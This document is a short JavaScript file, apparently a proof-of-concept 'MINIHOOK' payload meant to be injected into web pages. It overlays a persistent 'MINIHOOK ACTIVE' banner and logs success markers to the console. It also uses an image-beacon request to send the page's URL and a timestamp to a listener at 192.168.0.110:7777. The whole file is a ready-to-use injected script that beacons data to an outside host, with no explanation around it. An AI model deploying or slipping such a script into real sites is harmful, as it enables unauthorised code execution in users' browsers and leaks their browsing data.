(function(){
  var globalObj = (function(){ try { return window; } catch (_) { return this; } }).call(null);
  if (!globalObj) {
    return;
  }

  if (globalObj.__MINIHOOK_PAYLOAD_DONE) {
    try { console.warn('MINIHOOK_SKIP_' + Date.now()); } catch (_) {}
    return;
  }
  globalObj.__MINIHOOK_PAYLOAD_DONE = true;

  try {
    var bannerId = '__MINIHOOK_VISIBLE';
    if (!document.getElementById(bannerId)) {
      var banner = document.createElement('div');
      banner.id = bannerId;
      banner.textContent = 'MINIHOOK ACTIVE';
      banner.style.position = 'fixed';
      banner.style.left = '10px';
      banner.style.top = '10px';
      banner.style.zIndex = '2147483647';
      banner.style.background = 'rgba(0,0,0,0.85)';
      banner.style.color = '#00FF99';
      banner.style.padding = '10px 16px';
      banner.style.font = '18px/1.2 sans-serif';
      banner.style.borderRadius = '6px';
      banner.style.boxShadow = '0 4px 12px rgba(0,0,0,0.5)';
      document.documentElement.appendChild(banner);
      setInterval(function(){
        try {
          var el = document.getElementById(bannerId);
          if (el) el.style.opacity = '1';
        } catch (_) {}
      }, 1500);
    }
  } catch (_) {}

  try {
    var href = (globalObj.location && globalObj.location.href) ? encodeURIComponent(globalObj.location.href) : '';
    var img = new Image();
    img.src = 'http://192.168.0.110:7777/minihook?href=' + href + '&ts=' + Date.now();
  } catch (_) {}

  try {
    console.error('MINIHOOK_OK_' + Date.now());
  } catch (_) {}
})();
